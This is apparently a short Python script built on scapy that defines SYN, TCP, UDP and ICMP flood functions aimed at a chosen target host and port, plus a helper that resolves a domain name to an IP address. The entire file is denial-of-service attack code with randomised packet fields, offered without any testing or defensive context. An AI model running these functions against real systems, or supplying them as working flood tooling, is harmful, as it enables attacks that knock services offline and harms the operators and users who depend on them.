# -*- coding: utf-8 -*-

import socket
from scapy.all import * 

def synFlood(target, port):
    ip = fuzz(IP(dst=target))
    syn = fuzz(TCP(dport=port, flags='S'))
    send(ip/syn, verbose=0)
    
def tcpFlood(target, port):
    ip = fuzz(IP(dst=target))
    tcp = fuzz(TCP(dport=port))
    send(ip/tcp, verbose=0)
    
def udpFlood(target, port):
    ip = fuzz(IP(dst=target))
    udp = fuzz(UDP(dport=port))
    send(ip/udp, verbose=0)
    
def icmpFlood(target):
    ip = fuzz(IP(dst=target))
    icmp = fuzz(ICMP())
    send(ip/icmp, verbose=0)
            
def getIP(domainName):
    return socket.gethostbyname(domainName)
